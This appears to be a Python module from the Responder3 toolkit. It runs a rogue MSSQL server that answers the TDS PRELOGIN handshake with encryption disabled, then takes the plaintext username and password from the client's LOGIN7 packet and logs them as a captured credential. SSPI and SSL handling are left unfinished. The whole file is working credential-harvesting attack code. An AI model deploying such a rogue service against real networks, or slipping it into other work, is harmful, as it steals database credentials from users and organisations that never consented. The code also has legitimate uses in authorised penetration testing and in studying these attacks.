import enum
import logging
import asyncio
import os

from responder3.core.logging.logger import *
from responder3.core.asyncio_helpers import R3ConnectionClosed
from responder3.core.commons import *
from responder3.protocols.MSSQL import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession
from responder3.core.logging.log_objects import Credential



class MSSQLSession(ResponderServerSession):
	def __init__(self, connection, log_queue):
		ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)
		self.status = SessionStatus.START

class MSSQL(ResponderServer):
	def init(self):
		pass

	async def send_data(self, data):
		self.cwriter.write(data)
		await self.cwriter.drain()

	@r3trafficlogexception
	async def run(self):
		# main loop
		while not self.shutdown_evt.is_set():
			try:
				result = await asyncio.gather(*[TDSPacket.from_streamreader(self.creader, timeout=None)], return_exceptions=True)
			except asyncio.CancelledError as e:
				raise e
				
			if isinstance(result[0], R3ConnectionClosed):
				return
				
			elif isinstance(result[0], Exception):
				raise result[0]
				
			else:
				packet = result[0]

			#print(str(packet))

			if self.session.status == SessionStatus.START:
				if packet.type != PacketType.PRELOGIN:
					raise Exception('Unexpected packet type! %s '% packet.type)
				self.session.status = SessionStatus.PREAUTH_SENT
				data = PRELOGIN()
				data.version = b'\x11\x02\x00\x00\x00\x00'
				data.encryption = Encryption.NOT_SUP
				data.instvalidity = ''
				data.thread_id = 0
				data.mars = False
				data.fedauthrequired = False
				data.traceid = os.urandom(32)

				rp = TDSPacket()
				rp.type = PacketType.TABULAR_RESULT
				rp.status = PacketStatus.EOM
				rp.spid = 0
				rp.packet_id = 1
				rp.window = 0
				rp.data = data
				await self.send_data(rp.to_bytes())
				continue

			elif self.session.status == SessionStatus.PREAUTH_SENT:
				if packet.type == PacketType.LOGIN7:
					cred = Credential(
							'plaintext',
							username = packet.data.username,
							password = packet.data.password,
							fullhash = '%s:%s' % (packet.data.username, packet.data.password)
						)
					await self.logger.credential(cred)
					return

				elif packet.type == PacketType.SSPI:
					self.session.status = SessionStatus.SSPI_AUTH
					#TODO
					return
					#raise Exception('Not implemented!')

				#elif 

			#TODO: implement SSPI and SSL auth (latter is encryption on flag set)
			#elif self.session.status == SessionStatus.SSPI_AUTH:

			else:
				raise Exception('Unexpected packet at this stage!')

